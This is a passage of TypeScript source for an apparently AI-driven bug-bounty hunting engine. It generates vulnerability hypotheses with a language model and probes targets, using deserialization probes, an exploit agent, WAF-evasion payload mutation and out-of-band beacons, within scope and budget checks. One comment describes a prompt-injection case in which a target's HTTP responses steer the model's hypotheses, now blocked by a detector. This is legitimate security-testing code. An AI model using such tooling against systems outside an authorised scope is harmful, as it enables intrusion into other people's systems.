      for (const [pluginName, pluginData] of Object.entries(entry as Record<string, unknown>)) {
        if (pluginName === 'target_uri' || pluginName === 'http_status') continue;
        const nameNorm = pluginName.toLowerCase().replace(/[^a-z0-9]/g, '');
        if (CVE_SEED_BLOCKLIST.has(nameNorm) || !CVE_SEED_ALLOWLIST.has(nameNorm)) continue;
        const versionMatch = JSON.stringify(pluginData).match(/(\d+\.\d+[\d.]*)/);
        results.push({ name: pluginName, version: versionMatch?.[1] });
      }
    }
    return results.slice(0, 3);
  }

  private async seedCVEHypotheses(techObs: Record<string, unknown>): Promise<void> {
    const techs = this.extractVersionedTechs(techObs);
    if (!techs.length) return;

    for (const { name, version } of techs) {
      const cves = await nvdClient.lookupByKeyword(name, version);
      const highCves = cves.filter(c => c.cvssScore >= 7.0);
      if (!highCves.length) continue;

      for (const cve of highCves.slice(0, 2)) {
        const cweNum = parseInt((cve.cweIds[0] ?? '').replace('CWE-', ''), 10);
        const vulnClass = CWE_TO_VULN_CLASS[cweNum] ?? 'misconfig';

        const hypothesis: Hypothesis = {
          id: uuidv4(),
          vulnClass,
          targetUrl: this.state.targetUrl,
          reasoning: `CVE-seeded: ${cve.id} (CVSS ${cve.cvssScore}) in ${name}${version ? ` ${version}` : ''} — ${cve.description.slice(0, 200)}`,
          confidence: 0.7,
          priority: cve.cvssScore >= 9.0 ? 10 : 8,
          evidence: [],
          status: 'pending',
          createdAt: Date.now(),
        };

        this.state.hypotheses.push(hypothesis);
        logger.info('[HunterEngine] CVE hypothesis seeded', { cveId: cve.id, vulnClass, cvss: cve.cvssScore });
      }

      this.emit('hunt:cve_seeded', {
        sessionId: this.state.sessionId,
        tech: `${name}${version ? ` ${version}` : ''}`,
        cveIds: highCves.slice(0, 5).map(c => c.id),
        maxCvss: Math.max(...highCves.map(c => c.cvssScore)),
      });
    }

    if (this.state.hypotheses.length > MAX_HYPOTHESES) {
      this.state.hypotheses.sort((a, b) => truncationRank(b) - truncationRank(a));
      this.state.hypotheses.splice(MAX_HYPOTHESES);
    }
  }

  // ── Phase 2: Hypothesize ────────────────────────────────────────────────────
  /**
   * Fresh, named endpoint roster for the hypothesize() prompt — built directly
   * from discoveredEndpoints on every call rather than routed through
   * observationCompressor. The compressor summarizes old observations into
   * tag/count aggregates, which would silently re-collapse "/api/wifi/interfaces"
   * back into "N endpoints discovered" once enough iterations pass. Endpoint
   * identity has to survive as text the model can copy into targetUrl, not a count.
   */
  private buildEndpointRoster(): string {
    const already = new Set(this.state.hypotheses.map(h => h.targetUrl));
    const unique = [...new Set(this.state.discoveredEndpoints)];
    if (unique.length === 0) return '';

    const INTERESTING = /(admin|internal|debug|private|wifi|network|monitor|scan|capture|build|deploy|exec|shell|terminal|config|secret|token|key|user|account|upload|file|password|auth)/i;
    const scored = unique.map(url => ({
      url,
      alreadyHypothesized: already.has(url),
      interesting: INTERESTING.test(url),
    }));
    scored.sort((a, b) => {
      if (a.alreadyHypothesized !== b.alreadyHypothesized) return a.alreadyHypothesized ? 1 : -1;
      if (a.interesting !== b.interesting) return a.interesting ? -1 : 1;
      return 0;
    });

    const CAP = 60;
    const shown = scored.slice(0, CAP);
    const omitted = unique.length - shown.length;
    const lines = shown.map(s => `- ${s.url}${s.alreadyHypothesized ? '  (already hypothesized)' : ''}`);
    return [
      `Discovered endpoints (${unique.length} total${omitted > 0 ? `, showing top ${shown.length} by relevance` : ''}):`,
      ...lines,
      omitted > 0 ? `...and ${omitted} more endpoints not shown (still available for future iterations).` : '',
    ].filter(Boolean).join('\n');
  }

  private async hypothesize(): Promise<void> {
    logger.info("HYPOTHESIZE phase", { session: this.state.sessionId });

    const context = this.buildContext();
    const endpointRoster = this.buildEndpointRoster();

    // Pull smart orchestration template as structured context
    const chainTemplate = promptKB.render("smart_tool_chain", {
      goal: "vulnerability hypothesis generation",
      current_findings: `${this.state.confirmedFindings.length} confirmed, ${this.state.observations.length} observations`,
    });

    // Build a rich query text from actual observation signals for semantic retrieval
    // Compress old observations into a historical state vector so the prompt
    // doesn't grow unboundedly across many iterations (context window management).
    // Yield before and after the synchronous compression work so concurrent
    // socket events and sibling hunts aren't starved on a busy event loop.
    await this.yieldToEventLoop();
    const { historicalSummary, recentObservations } = observationCompressor.compress(
      this.state.sessionId,
      this.state.observations,
    );
    await this.yieldToEventLoop();
    const recentObs = recentObservations;
    const obsTags = [...new Set(recentObs.flatMap(o => o.tags))].join(', ');
    const confirmedClasses = [...new Set(this.state.confirmedFindings.map(f => f.hypothesis.vulnClass ?? ''))].join(', ');
    const semanticQuery = [
      `Target: ${this.state.targetUrl}`,
      obsTags ? `Signals observed: ${obsTags}` : '',
      confirmedClasses ? `Confirmed vulnerability classes: ${confirmedClasses}` : '',
      `Hypothesizing: what vulnerabilities are most likely on this target`,
    ].filter(Boolean).join('. ');

    // Per-hunt corpusEnrichment flag (set at launch) takes priority.
    // The CORPUS_ENRICHMENT env var acts as a global process-level override.
    const enrichmentOn = this.state.corpusEnrichment !== false && process.env.CORPUS_ENRICHMENT !== 'false';
    let domainKnowledge = '';
    let corpusEntries: import('../intelligence/JsonPromptLoader').CorpusEntry[] = [];
    if (enrichmentOn) {
      const result = await jsonPromptLoader.getContextEntriesAsync(semanticQuery, 7);
      domainKnowledge = result.block;
      corpusEntries = result.entries;
    }

    // ── RAG: RL framework priorities ──────────────────────────────────────────
    // If observations contain recognized framework tags, pull historically
    // successful vuln classes from the reinforcement store.
    const allObsTags = recentObs.flatMap(o => o.tags);
    const detectedFrameworks = [...new Set(
      allObsTags.filter(t => /express|spring|django|rails|laravel|wordpress|flask|next|nuxt|strapi/i.test(t))
    )];
    let rlPriorityHint = '';
    for (const fw of detectedFrameworks.slice(0, 2)) {
      const priorities = await this.rlWiring.getFrameworkPriorities(fw);
      if (priorities.length > 0) {
        rlPriorityHint += `RL history: ${fw} targets have yielded ${priorities.slice(0, 5).join(', ')}. `;
      }
    }

    // Wait for Phase 0 recon (best-effort — won't block past 8s if still running)
    if (this.reconPromise && !this.reconContext) {
      await Promise.race([
        this.reconPromise,
        new Promise(resolve => setTimeout(resolve, 8000)),
      ]).catch(() => {});
    }

    // ── RAG: promptKB methodology hints ──────────────────────────────────────
    // Inject structured attack objectives from the KB for observed candidate
    // vuln classes so the model knows the expected exploitation approach.
    const KNOWN_VULN_TAGS = new Set(['sqli','xss','ssrf','idor','rce','lfi','xxe','csrf','cors','open_redirect']);
    const candidateVulns = [...new Set(allObsTags.filter(t => KNOWN_VULN_TAGS.has(t)))].slice(0, 3);
    let methodologyHints = '';
    if (enrichmentOn) {
      for (const vc of candidateVulns) {
        const templates = promptKB.getForVulnClass(vc);
        if (templates.length > 0) {
          const objMatch = templates[0].template.match(/Objective:\n((?:- .+\n?)+)/);
          if (objMatch) {
            methodologyHints += `${vc.toUpperCase()} — ${objMatch[1].trim().slice(0, 220)}\n`;
          }
        }
      }
    }

    const prompt = `You are an expert security researcher performing bug bounty hunting. \
Think step by step before generating hypotheses.

Step 1 — Interpret the observations: what do the signals imply about the stack, \
authentication model, and likely attack surface?
Step 2 — Identify prerequisite conditions: which vulnerability classes have their \
preconditions already satisfied by what you've observed?
Step 3 — Estimate what confirming evidence would look like for each candidate class.
Step 4 — Output your hypotheses as JSON.

Target: ${this.state.targetUrl}
${historicalSummary ? `${historicalSummary}\n\n` : ''}Recent observations (anomaly-sorted):
${JSON.stringify(recentObs, null, 2)}

${endpointRoster ? `${endpointRoster}\nPrefer targetUrl values from this roster over the base target — a hypothesis naming a specific discovered endpoint is more valuable than one aimed at the root URL.\n\n` : ''}Current confirmed findings: ${this.state.confirmedFindings.length}
Previously tested hypotheses: ${this.state.hypotheses.length}

Orchestration context:
${chainTemplate.split('\n').slice(0, 8).join('\n')}

${toolKnowledge.getSummaryBlock()}
${domainKnowledge ? `\nRelevant domain knowledge and past examples:\n${domainKnowledge}\n` : ''}${rlPriorityHint ? `\nCross-hunt intelligence: ${rlPriorityHint}\n` : ''}${methodologyHints ? `\nAttack methodology for observed candidates:\n${methodologyHints}` : ''}${this.reconContext ? `\n\nPre-hunt OSINT recon (use this to make targetUrl fields specific — probe discovered subdomains and historical paths):\n${this.reconContext.summary}\n` : ''}
Generate 3-5 specific vulnerability hypotheses based on the observations.
Each hypothesis must have:
- vulnClass: MUST be exactly one of: ${CANONICAL_VULN_CLASSES.join("/")} — pick the
  single closest match. Do not invent a new label or describe an outcome/impact
  (e.g. "account takeover") as if it were a vulnClass.
- targetUrl: specific URL or endpoint to test
- reasoning: why you believe this vulnerability exists
- confidence: 0.0-1.0 based on evidence strength
- priority: 1-10 (10=highest)

Return ONLY valid JSON array of hypothesis objects.`;

    this.emit("hunt:ai_reasoning", {
      sessionId: this.state.sessionId,
      task: "Hypothesis Generation",
      phase: "thinking",
      context: {
        observations: this.state.observations.length,
        hypotheses: this.state.hypotheses.length,
        iteration: this.state.iteration,
      },
      promptPreview: prompt.slice(0, 1500),
      enrichmentActive: enrichmentOn,
      corpusEntries,
    });

    const _aiReasoningStart = Date.now();
    try {
      const response = await this.modelRouter.reason(prompt, this.state.sessionId);
      const _aiReasoningMs = Date.now() - _aiReasoningStart;
      // Yield after model response so the event loop can process other callbacks
      // before the synchronous JSON.parse (which can be slow for large responses).
      await this.yieldToEventLoop();
      // Guard against prompt injection in LLM output before parsing. A flagged
      // response previously only logged a warning and was parsed/used anyway —
      // meaning a target that can shape observation data (its own HTTP
      // responses) fed into this prompt could inject hypotheses that steer the
      // hunt itself (waste budget, target other domains, etc.) with nothing
      // but a log line to show for it. Throwing here routes to the existing
      // catch block's generateDefaultHypotheses() fallback — the same safe
      // path already used for a JSON-parse failure — instead of trusting a
      // response the detector itself just flagged as compromised.
      try {
        const { promptInjectionDetector } = await import('../governance');
        const injection = promptInjectionDetector.detect(response, 'hunter-engine', 'HunterEngine');
        if (!injection.safe) {
          logger.warn('[HunterEngine] Prompt injection detected in model response — discarding, using default hypotheses', { score: injection.score, reasons: injection.reasons });
          throw new Error('Prompt injection detected in hypothesis-generation response');
        }
      } catch (injectionErr) {
        if (injectionErr instanceof Error && injectionErr.message.startsWith('Prompt injection detected')) throw injectionErr;
        // Detector itself unavailable/errored — non-critical, proceed with the response.
      }
      // Cap response slice to 64KB before parsing to prevent OOM from huge model outputs
      const rawSlice = response.match(/\[[\s\S]+\]/)?.[0]?.slice(0, 65536) || "[]";
      const parsed = JSON.parse(rawSlice);

      // normalizeVulnClass() is the single taxonomy chokepoint (see
      // lib/vuln-taxonomy.ts) — a class the model invents that isn't in the
      // canonical list (or a known alias of one) is discarded here, loudly,
      // rather than silently entering the pipeline as "unknown" and dying
      // unnoticed several boundaries downstream. This is exactly the failure
      // mode that let a chain-synthesis "authentication_bypass" hypothesis
      // fall through the LogicExploitAgent routing gate with zero signal.
      const newHypotheses: Hypothesis[] = parsed
        .map((h: Record<string, unknown>) => {
          const vulnClass = normalizeVulnClass(h.vulnClass as string);
          if (!vulnClass) {
            logger.warn("[HunterEngine] Discarding hypothesis — unrecognized vulnClass", {
              raw: h.vulnClass, targetUrl: h.targetUrl,
            });
            return null;
          }
          return {
            id: uuidv4(),
            vulnClass,
            targetUrl: h.targetUrl as string || this.state.targetUrl,
            reasoning: h.reasoning as string || "",
            confidence: Math.min(1, Math.max(0, Number(h.confidence) || 0.5)),
            priority: Math.min(10, Math.max(1, Number(h.priority) || 5)),
            evidence: this.state.observations.filter(o => o.anomalyScore > 0.3),
            status: "pending" as const,
            createdAt: Date.now(),
            modelSource: this.modelRouter.lastProvider,
          };
        })
        .filter((h: Hypothesis | null): h is Hypothesis => h !== null);

      // Sort by priority * confidence
      newHypotheses.sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence));
      this.state.hypotheses.push(...newHypotheses);
      if (this.state.hypotheses.length > MAX_HYPOTHESES) {
        this.state.hypotheses.sort((a, b) => truncationRank(b) - truncationRank(a));
        this.state.hypotheses.splice(MAX_HYPOTHESES);
      }

      this.emit("hunt:ai_reasoning", {
        sessionId: this.state.sessionId,
        task: "Hypothesis Generation",
        phase: "complete",
        rawResponse: response.slice(0, 3000),
        durationMs: _aiReasoningMs,
        generatedCount: newHypotheses.length,
      });
      this.emit("hunt:hypotheses", { count: newHypotheses.length, hypotheses: newHypotheses });
      logger.info("Generated hypotheses", { count: newHypotheses.length });
    } catch (err) {
      if (err instanceof ClaudeUnavailableError) {
        logger.error("[HunterEngine] Claude unavailable — halting hunt", { err: String(err) });
        this.aborted = true;
        this.emit("hunt:error", {
          sessionUuid: this.state.sessionId,
          error: "Claude unavailable — hunt halted. Check ANTHROPIC_API_KEY.",
        });
        return;
      }
      // Non-Claude error (JSON parse, etc.) — use generic defaults so the loop continues
      logger.error("Hypothesis generation failed — using defaults", { err });
      this.generateDefaultHypotheses();
    }
  }

  private isBudgetExhausted(): boolean {
    return this.state.budget.requestsMade >= this.state.budget.maxRequests;
  }

  // ── Phase 3: Probe ──────────────────────────────────────────────────────────
  private async probe(): Promise<void> {
    logger.info("PROBE phase", { session: this.state.sessionId });

    // Refresh auth session if it expired mid-hunt (30-min TTL)
    if (this.authConfig) {
      try {
        const refreshed = await sessionManager.ensureSession(this.state.programId, this.authConfig);
        this.authHeaders = refreshed.headers;
      } catch { /* non-critical — continue unauthenticated */ }
    }

    const allowlistExcluded = applyVulnClassAllowlist(this.state.hypotheses, this.vulnClassAllowlist);
    if (allowlistExcluded.length > 0) {
      logger.info("[HunterEngine] vulnClassAllowlist excluded hypotheses", {
        session: this.state.sessionId,
        allowlist: this.vulnClassAllowlist,
        excludedCount: allowlistExcluded.length,
        excludedClasses: [...new Set(allowlistExcluded.map(h => h.vulnClass))],
      });
    }

    const pending = this.state.hypotheses
      .filter(h => h.status === "pending")
      .sort((a, b) => (b.priority * b.confidence) - (a.priority * a.confidence))
      .slice(0, 8);

    for (const hypothesis of pending) {
      // Abort check — a user stop() must halt model spend within one probe, not
      // wait for the next OHPU iteration boundary. This is the granular gate that
      // makes "model calls cease within seconds" true (each probe may run the
      // LogicExploitAgent + reasoning calls; we refuse to start a new one).
      if (this.aborted) {
        logger.info("HunterEngine: Abort requested — halting probe phase", { session: this.state.sessionId });
        break;
      }

      // Pre-flight budget check — stop probing if we've hit the request cap
      if (this.isBudgetExhausted()) {
        logger.info("HunterEngine: Budget exhausted — halting probe phase", {
          requestsMade: this.state.budget.requestsMade,
          maxRequests: this.state.budget.maxRequests,
        });
        this.emit("hunt:budget_exhausted", {
          requestsMade: this.state.budget.requestsMade,
          maxRequests: this.state.budget.maxRequests,
        });
        break;
      }

      // Failure prediction — skip low-probability probes early to preserve budget
      const evidenceTags = hypothesis.evidence.flatMap(e => e.tags ?? []);
      const complexity = failurePrediction.complexityFrom(evidenceTags, hypothesis.reasoning);
      const prediction = failurePrediction.predict(hypothesis.vulnClass, complexity);
      if (prediction.shouldSkip) {
        hypothesis.status = "deferred";
        // info, not debug — this used to be invisible at the default log level,
        // which is exactly how a whole vuln class silently going unprobed for
        // an entire hunt went undetected across the whole arc.
        logger.info("[HunterEngine] Failure prediction skip — hypothesis never probed", {
          hypothesisId: hypothesis.id, vulnClass: hypothesis.vulnClass, targetUrl: hypothesis.targetUrl,
          complexity, reason: prediction.reason,
        });
        this.emit("hunt:hypothesis_skipped", {
          hypothesisId: hypothesis.id, vulnClass: hypothesis.vulnClass, targetUrl: hypothesis.targetUrl,
          reason: prediction.reason,
        });
        continue;
      }

      hypothesis.status = "probing";
      this.emit("hunt:probing", { hypothesisId: hypothesis.id, vulnClass: hypothesis.vulnClass });

      // Scope check before probing — also never-probed, not a tested negative
      const { allowed } = await this.scopeGuard.isInScope(hypothesis.targetUrl, this.state.programId);
      if (!allowed) {
        hypothesis.status = "deferred";
        continue;
      }

      // Self-confirmed evidence — fires before ANY other dispatch, including
      // LogicExploitAgent, for any hypothesis seeded by a dedicated prober
      // whose hypotheses are already a 1:1 map over its own actively-confirmed
      // vulns (see SELF_CONFIRMED_SOURCES comment below). This must run first:
      // jwt_confusion_probe and two_factor_bypass_probe both tag their
      // hypotheses vulnClass "auth_bypass", which the LogicExploitAgent branch
      // below also claims — if that branch ran first (as it originally did,
      // placed right before generic tool-select), it would silently steal
      // these hypotheses, run its own JWT/2FA-unaware Playwright probing, find
      // nothing, and mark them "inconclusive" — discarding real, already-
      // gathered evidence. Confirmed happening in the field: both jwt_confusion
      // hits landed on logic_exploit_agent (77s/93s Playwright runs) instead of
      // the self-confirmed short-circuit before this was moved. No re-test is
      // needed or possible via a generic tool; the evidence gathered at
      // OBSERVE time IS the probe result — synthesize a ProbeResult from the
      // attached evidence and let update() do confidence math / promotion.
      const selfConfirmed = hypothesis.evidence.find(e => SELF_CONFIRMED_SOURCES.has(e.source));
      if (selfConfirmed) {
        const { detail } = selfConfirmed.data as { detail?: string };
        const result: ProbeResult = {
          hypothesisId: hypothesis.id,
          tool: selfConfirmed.source,
          command: `${selfConfirmed.source}:${hypothesis.targetUrl}`,
          output: String(detail || hypothesis.reasoning),
          parsed: { found: true, vulnerable: true, rawOutput: detail || hypothesis.reasoning },
          success: true,
          duration: 0,
        };
        this.state.probes.push(result);
        this.rlWiring.onToolResult(selfConfirmed.source, hypothesis.vulnClass, true, hypothesis.confidence);
        failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, true);
        this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId: "direct" });
        hypothesis.status = "probing"; // let update phase confirm it
        continue;
      }

      // Tech-payload-prober replay — fires before regular tool dispatch for any
      // hypothesis whose evidence came from techPayloadProber (ssti/exposed_admin,
      // and the tech-tailored rce shapes it tests that the generic deserialize
      // branch below doesn't cover). Same reasoning as the deserialize branch:
      // a generic RL-selected tool has no idea how to resend an SSTI oracle or
      // recheck a debug route, so without this the real evidence gathered at
      // OBSERVE time would be discarded and replaced with a probe that can't
      // possibly confirm it — the exact bug already fixed once for deserialize.
      const techProberEvidence = hypothesis.evidence.find(e => e.source === "tech_payload_prober");
      if (techProberEvidence) {
        const { technique, rawPayload } = techProberEvidence.data as { technique?: string; rawPayload?: string };
        if (technique) {
          const reprobe = await techPayloadProber.reprobeHypothesis(
            technique as Parameters<typeof techPayloadProber.reprobeHypothesis>[0],
            hypothesis.targetUrl, this.authHeaders, rawPayload, this.state.programId
          );
          this.state.budget.requestsMade++;
          if (reprobe.found) {
            const result: ProbeResult = {
              hypothesisId: hypothesis.id,
              tool: "tech_payload_prober",
              command: `${technique} ${hypothesis.targetUrl}`,
              output: reprobe.evidence,
              parsed: { found: true, vulnerable: true, rawOutput: reprobe.evidence },
              success: true,
              duration: 0,
            };
            this.state.probes.push(result);
            this.rlWiring.onToolResult("tech_payload_prober", hypothesis.vulnClass, true, hypothesis.confidence);
            failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, true);
            this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId: "direct" });
            hypothesis.status = "probing"; // let update phase confirm it
            hypothesis.confidence = Math.min(0.95, hypothesis.confidence + 0.2);
            continue;
          }
          // Replay didn't reproduce it — mark inconclusive rather than falling
          // through to a generic tool that's equally unequipped to test this.
          hypothesis.status = "inconclusive";
          failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, false);
          continue;
        }
      }

      // Deserialization POST probe — fires before regular tool dispatch for rce hypotheses
      if (hypothesis.vulnClass === "rce" || hypothesis.vulnClass === "deserialization") {
        const deserialResult = await this.probeDeserialize(hypothesis.targetUrl);
        if (deserialResult.found) {
          const result: ProbeResult = {
            hypothesisId: hypothesis.id,
            tool: "deserialize_probe",
            command: `POST ${deserialResult.endpoint}`,
            output: deserialResult.output,
            parsed: { found: true, vulnerable: true, rawOutput: deserialResult.output, flagValues: deserialResult.flagValues },
            success: true,
            duration: deserialResult.duration,
          };
          this.state.probes.push(result);
          this.state.budget.requestsMade++;
          this.rlWiring.onToolResult("deserialize_probe", hypothesis.vulnClass, true, hypothesis.confidence);
          failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, true);
          this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId: "direct" });
          // Jump straight to update — hypothesis handled. Must be "probing", not
          // "pending": update() only ever looks at status==="probing" (line ~2234).
          // Setting this back to "pending" left it eligible for probe()'s own
          // pending-hypothesis selector (line ~1981) to re-pick it every single
          // probe() call forever — update() could never see it to resolve a
          // verdict, so it never left this loop. Confirmed in the field: 8 rce
          // hypotheses accumulated 10-12 repeat deserialize_probe hits each,
          // burning 83 of 113 requests in one hunt without ever confirming.
          hypothesis.status = "probing"; // let update phase confirm it
          hypothesis.confidence = Math.min(0.95, hypothesis.confidence + 0.3);
          (hypothesis as unknown as Record<string, unknown>)._deserialProbeHit = true;
          (hypothesis as unknown as Record<string, unknown>)._deserialOutput = deserialResult.output;
          continue;
        }
      }

      // LogicExploitAgent — Claude-directed Playwright for stateful/chained probes.
      // race_condition added alongside business_logic: it's the same agent's
      // fire_race_condition tool, just a distinct vulnClass in the taxonomy —
      // without this it fell through to the generic single-request tool path,
      // which structurally cannot fire the concurrent burst a race needs.
      if (
        ["business_logic", "race_condition", "idor", "auth_bypass"].includes(hypothesis.vulnClass) &&
        ClaudeClient.isAvailable()
      ) {
        try {
          const logicResult = await logicExploitAgent.probe(
            hypothesis,
            this.state.sessionId,
            this.authHeaders,
            Object.keys(this.secondaryAuthHeaders).length > 0 ? this.secondaryAuthHeaders : undefined,
            this.state.programId,
          );
          const result: ProbeResult = {
            hypothesisId: hypothesis.id,
            tool: "logic_exploit_agent",
            command: `claude-sonnet:${hypothesis.vulnClass}`,
            output: logicResult.evidence || logicResult.rawHttpLog || "No evidence collected",
            parsed: {
              found: logicResult.confirmed,
              payload: logicResult.payload,
              rawOutput: logicResult.evidence,
            },
            success: logicResult.confirmed,
            duration: logicResult.duration,
            rawHttpLog: logicResult.rawHttpLog,
            videoPath: logicResult.videoPath,
          };
          this.state.probes.push(result);
          this.state.budget.requestsMade++;
          this.rlWiring.onToolResult("logic_exploit_agent", hypothesis.vulnClass, logicResult.confirmed, hypothesis.confidence);
          failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, logicResult.confirmed);
          this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId: "logic_agent" });
          if (!logicResult.confirmed) hypothesis.status = "inconclusive";
          continue;
        } catch (err) {
          logger.warn("[HunterEngine] LogicExploitAgent error — falling through to standard tool", { err: String(err) });
        }
      }

      // Select appropriate tool — honour retry hint if set, otherwise let the
      // RL store pick the best-performing tool for this vuln class.
      const toolName = hypothesis.toolHint || await this.selectToolRL(hypothesis.vulnClass);
      delete hypothesis.toolHint;

      // On gray-zone retries (retryCount > 0), route the payload mutation off
      // WHY the previous attempt failed (set by update()'s gray-zone branch)
      // rather than always mutating on every retry regardless of cause.
      // not_injectable already got a tool swap via toolHint above instead —
      // skip payload mutation entirely for that reason so the two knobs never
      // both turn on the same retry.
      let probeUrl = hypothesis.targetUrl;
      if ((hypothesis.retryCount ?? 0) > 0 && hypothesis.lastFailureReason !== "not_injectable") {
        const reason = hypothesis.lastFailureReason;
        let picked: string | null = null;

        if (reason === "waf_blocked") {
          const waf = await this.pickWafEvasionPayload(hypothesis.vulnClass, hypothesis.targetUrl);
          if (waf) {
            picked = waf.payload;
            // Confidently attributable — record once the outcome is known
            // (update()'s confirmed/rejected branches), keyed by VENDOR.
            hypothesis.retryTechnique = { reason: "waf_blocked", axisKey: waf.vendor, technique: waf.technique };
          }
        }
        if (!picked) {
          // reflected_not_executed / no_signal / waf_blocked-with-no-
          // authorized-vendor-intel all degrade to this same generic path.
          // The actual fix vs before: pick a REAL mutation — mutate()'s
          // first entry is always {technique:"baseline"}, i.e. the
          // unmutated payload, so the old mutations[0] pick was a no-op
          // dressed up as a WAF-bypass attempt.
          const mutations = payloadMutator.mutate(hypothesis.vulnClass).filter(m => m.technique !== "baseline");
          const chosen = mutations[0];
          // Loud regression guard for the original bug: its entire signature was
          // silence (mutations[0] quietly WAS the baseline). Don't just rely on
          // the filter above never breaking — assert it here so a regression
          // fires during a real hunt, not only in a test that happens to cover it.
          if (chosen && chosen.technique === "baseline") {
            logger.error("Gray-zone retry selected the unmutated baseline payload — mutate() filter regression", {
              hypothesisId: hypothesis.id, vulnClass: hypothesis.vulnClass,
            });
          }
          picked = chosen?.variant ?? null;
          // Only reflected_not_executed with a detected stack is confidently
          // attributable to "this encoding fixed a parser-level issue" — the
          // degraded waf_blocked case has no vendor (that's why it degraded),
          // and no_signal never had a confident cause to attribute in the
          // first place. Both are retried anyway (best-effort) but not recorded.
          if (chosen && reason === "reflected_not_executed") {
            const stack = this.getDetectedStackKey();
            if (stack) {
              hypothesis.retryTechnique = { reason: "reflected_not_executed", axisKey: stack, technique: chosen.technique };
            }
          }
        }
        if (picked) {
          const params = payloadMutator.findInjectableParams(hypothesis.targetUrl);
          if (params.length > 0) {
            probeUrl = payloadMutator.injectPayload(hypothesis.targetUrl, params[0], picked);
          }
        }
      }
      delete hypothesis.lastFailureReason;

      const probeResult = await this.runTool(toolName, probeUrl, hypothesis);

      // OOB beacon probe for blind/async vuln classes that don't produce immediate signals
      const oobClasses = ["ssrf", "xss", "sqli", "rce", "xxe"];
      let oob: { hit: boolean; beaconId?: string; summary?: string } = { hit: false };
      if (oobClasses.includes(hypothesis.vulnClass) && !probeResult.found && !probeResult.injectable) {
        oob = await this.runOOBProbe(hypothesis.targetUrl, hypothesis.vulnClass);
      }
      const oobHit = oob.hit;

      // A tool's found/count/injectable/vulnerable flags are only meaningful evidence
      // for the vuln classes it actually tests for. curl_probe, e.g., discards the
      // response body (-o /dev/null) and derives `found`/`count` purely from missing
      // security headers — signal that's real for security_headers/cors/csrf but
      // meaningless for content-disclosure classes like lfi/sqli/xss. Feeding that
      // unrelated "found" through as success inflated confidence on findings whose
      // payload never actually worked (e.g. LFI probes rejected everywhere in
      // verification with "Access denied" bodies still scored 0.9+ pre-verification
      // because curl_probe's missing-header count happened to be nonzero). Gate on
      // the tool's own declared vulnClasses so only on-topic evidence counts.
      const toolSupportsClass = this.mergedTools[toolName]?.vulnClasses?.includes(hypothesis.vulnClass) ?? true;
      const result: ProbeResult = {
        hypothesisId: hypothesis.id,
        tool: toolName,
        command: String(probeResult.command || ""),
        // Surface the OOB command output (e.g. whoami) in the evidence when present.
        output: oobHit
          ? `OOB callback received — ${hypothesis.vulnClass} confirmed${oob.summary ? `\n${oob.summary}` : ""}`
          : String(probeResult.rawOutput || ""),
        parsed: probeResult,
        success: Boolean(oobHit || (toolSupportsClass && (probeResult.found || probeResult.injectable || probeResult.count || probeResult.vulnerable))),
        duration: Number(probeResult.duration || 0),
        rawHttpLog: oobHit && oob.summary ? oob.summary : undefined,
        oobBeaconId: oob.beaconId,
        oobConfirmed: oobHit,
      };

      this.state.probes.push(result);
      if (this.state.probes.length > MAX_PROBES) this.state.probes.shift();
      this.state.budget.requestsMade += Number(probeResult.requestsMade || 1);
      this.rlWiring.onToolResult(toolName, hypothesis.vulnClass, result.success, hypothesis.confidence);
      failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, result.success);
      const proxyId = egressAllocator.getCurrentAssignment(hypothesis.targetUrl) ?? 'direct';
      this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId });

      // Track consecutive failures; after 5+, do a canary HTTP check to confirm hard ban
      if (result.success || probeResult.hardBanned) {
        this.consecutiveFailures = 0;
      } else {
        this.consecutiveFailures++;
      }

      if (this.consecutiveFailures >= 5 && !this.banCheckDone) {
        this.banCheckDone = true;
        let canaryHostname = '';
        try {
          canaryHostname = new URL(hypothesis.targetUrl).hostname;
          const resp = await scopedHttp.request({ url: hypothesis.targetUrl, method: "HEAD", timeout: 3000, validateStatus: () => true }, this.state.programId);
          if (resp.status === 403) {
            dynamicRateLimiter.recordResponse(canaryHostname, '/', 403, resp.headers as Record<string, string>);
            const signal = dynamicRateLimiter.getDetectionSignal(canaryHostname);
            if (signal) autoAdjuster.evaluate([signal]);
            this.hardBanned = true;
            this.emit('hunt:hard_banned', { target: canaryHostname, reason: 'IP hard-banned (403 confirmed after consecutive failures)' });
            logger.warn('[HunterEngine] Hard IP ban detected — terminating hunt early', { target: canaryHostname });
            break;
          }
        } catch (err: unknown) {
          // Network-level drops (ETIMEDOUT, ECONNRESET) indicate a broad IP block —
          // the target dropped our connection entirely rather than returning 403.
          const code = (err as { code?: string })?.code ?? '';
          if (code === 'ETIMEDOUT' || code === 'ECONNRESET' || code === 'ECONNREFUSED' || code === 'ENOTFOUND') {
            const host = canaryHostname || (() => { try { return new URL(hypothesis.targetUrl).hostname; } catch { return ''; } })();
            const isLoopback = /^(localhost|127(\.\d+){0,2}\.\d+|::1|0\.0\.0\.0)$/i.test(host);
            if (isLoopback) {
              // A loopback target refusing connections isn't a WAF/IP ban — there's
              // no network device between us and it to impose one. It means the
              // local dev server process itself died (crashed or was killed),
              // plausibly *by* the probe/crawl action that just ran against it.
              // That's a candidate unauthenticated service-disruption finding, not
              // a reason to log a nonsensical "IP banned" and discard it.
              const recentProbes = this.state.probes.slice(-6).map(p => ({ tool: p.tool, command: p.command, success: p.success }));
              this.emit('hunt:target_crashed', {
                target: host, code,
                lastHypothesis: { id: hypothesis.id, vulnClass: hypothesis.vulnClass, targetUrl: hypothesis.targetUrl },
                recentProbes,
              });
              contextWriter.alert('target_crash', {
                target: host, code,
                targetUrl: hypothesis.targetUrl,
                reasoning: `Local target became unreachable (${code}) after probing ${hypothesis.targetUrl} — candidate unauthenticated service-disruption finding, not an IP ban.`,
              });
              this.state.hypotheses.push({
                id: uuidv4(),
                vulnClass: 'service_disruption',
                targetUrl: hypothesis.targetUrl,
